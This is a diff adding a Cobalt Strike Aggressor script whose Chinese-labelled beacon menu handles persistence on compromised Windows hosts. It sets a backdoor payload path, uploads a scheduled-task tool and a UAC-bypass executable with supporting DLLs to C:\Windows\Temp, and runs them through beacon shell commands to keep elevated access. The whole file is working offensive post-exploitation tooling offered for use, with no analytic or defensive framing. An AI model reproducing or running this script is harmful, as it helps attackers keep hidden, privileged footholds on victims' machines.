@@ -1,0 +1,45 @@
+popup beacon_bottom {
+	menu "权限维持" {
+
+		item "0x01 设置维权马儿路径" {
+			local('$bid');
+			foreach $bid ($1){
+				prompt_text("filePath", $filePath, {
+					$filePath = $1;
+					return $filePath;
+				});
+			}
+		}
+ 	    item "0x02 上传维权工具" {
+			blog($1, "\c9=========== 上传 维权工具SchTask ==========");
+            $bid = $1;
+            $dialog = dialog("上传 SchTask", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &SchTask);
+            dialog_description($dialog, "全平台支持，软件地址：https://github.com/0x727/SchTask_0x727");
+            dbutton_action($dialog, "上传");
+            dialog_show($dialog);
+        }
+	    sub SchTask {
+            bcd($bid, $3['UploadPath']);
+            bupload($bid, script_resource("iscsicpl_BypassUAC.exe"));
+		    bupload($bid, script_resource("iscsiexe.dll"));
+		    bupload($bid, script_resource("iscsiexe.lib"));
+		    bupload($bid, script_resource("SchTask.exe"));
+        }
+
+		item "0x03 管理员权限一键维权"{
+			local('$bid');
+			foreach $bid ($1){
+				bshell($1,"C:\\Windows\\Temp\\SchTask.exe \"$filePath\" 1");
+			}
+		}
+		item "0x04 Bypass Uac维权"{
+			local('$bid');
+			foreach $bid ($1){
+				bshell($1, "C:\\Windows\\Temp\\iscsicpl_BypassUAC.exe \"C:\\Windows\\Temp\\SchTask.exe $filePath 1\"")
+			}
+		}
+
+
+	}
+}
+
